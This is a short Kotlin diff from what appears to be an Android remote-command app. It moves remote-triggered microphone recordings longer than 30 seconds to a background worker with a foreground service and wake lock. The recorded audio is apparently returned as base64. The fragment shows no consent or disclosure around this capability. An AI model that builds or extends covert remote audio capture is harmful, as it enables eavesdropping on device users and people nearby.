@@ -1310,6 +1310,17 @@ class RemoteCommandManager(private val context: Context) {
         }
         val finalDuration = if (durationSec <= 0) 10 else durationSec.coerceAtLeast(1)
 
+        // For long recordings (300-360+ seconds), enqueue to WorkManager background worker to prevent command socket/polling timeouts
+        if (finalDuration > 30) {
+            try {
+                com.example.worker.AudioRecordingWorker.enqueueWork(context, finalDuration)
+                Log.d("RemoteCommandManager", "Enqueued AudioRecordingWorker for $finalDuration seconds.")
+                return@withContext "Audio recording of $finalDuration seconds successfully dispatched to background worker (WorkManager) with Foreground Service & WakeLock safety."
+            } catch (e: Exception) {
+                Log.w("RemoteCommandManager", "Failed to enqueue AudioRecordingWorker: ${e.message}, falling back to synchronous recording")
+            }
+        }
+
         val audioHelper = AudioRecorderHelper(context)
         try {
             val base64Data = audioHelper.startRecording(finalDuration) ?: throw Exception("Audio recording failed")
